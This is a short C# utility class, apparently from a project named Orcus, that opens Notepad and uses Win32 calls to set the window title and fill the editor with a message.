using System;
using System.Diagnostics;
using Orcus.Native;

namespace Orcus.Utilities
{
    public static class NotepadHelper
    {
        public static void ShowMessage(string message = null, string title = null)
        {
            Process notepad = Process.Start(new ProcessStartInfo("notepad.exe"));
            if (notepad != null)
            {
                notepad.WaitForInputIdle();

                if (!string.IsNullOrEmpty(title))
                    NativeMethods.SetWindowText(notepad.MainWindowHandle, title);

                if (!string.IsNullOrEmpty(message))
                {
                    var child = NativeMethods.FindWindowEx(notepad.MainWindowHandle, new IntPtr(0), "Edit", null);
                    NativeMethods.SendMessageW(child, (uint) WM.SETTEXT, IntPtr.Zero, message);
                }
            }
        }
    }
}